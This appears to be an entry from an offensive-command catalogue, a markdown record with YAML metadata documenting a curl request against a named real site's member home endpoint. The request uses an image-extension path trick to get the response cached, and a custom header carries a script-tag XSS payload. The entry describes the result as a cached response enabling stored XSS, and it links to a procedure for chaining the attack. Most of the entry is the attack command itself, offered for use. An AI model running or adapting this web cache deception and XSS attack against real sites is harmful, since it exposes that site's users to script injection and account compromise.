---
data: >-
  curl 'https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121' -H
  'X-Payload: <script>alert(1)</script>'
tags:
  - http
  - xss
type: command
executor: bash
platforms:
  - Web
id: f81dae21-8773-485e-bd6d-a174ee5ab45e
created_at: '2025-12-13T09:00:34.747Z'
updated_at: '2025-12-13T09:00:34.747Z'
verified: false
validated: true
submitted: true
---
# Get Member Home XSS

## Command

```bash
curl 'https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121' -H 'X-Payload: <script>alert(1)</script>'
```

## Description

HTTP GET request to member home endpoint with image extension and timestamp to cache an XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `t` | Timestamp for cache busting, e.g., 2021111121 | Yes |
| `X-Payload` | Custom header for injecting XSS payload | No |

## Examples

### Basic Usage

```bash
curl 'https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121'
```

### Advanced Usage

```bash
curl 'https://www.glassdoor.com/member/home/index.htm/x.jpeg?t=2021111121' -H 'X-Payload: <script>alert(1)</script>'
```

## Expected Output

Cached response enabling stored XSS execution.

## Related

- [[procedures/Chain-to-Stored-XSS-via-Payload-Caching]]
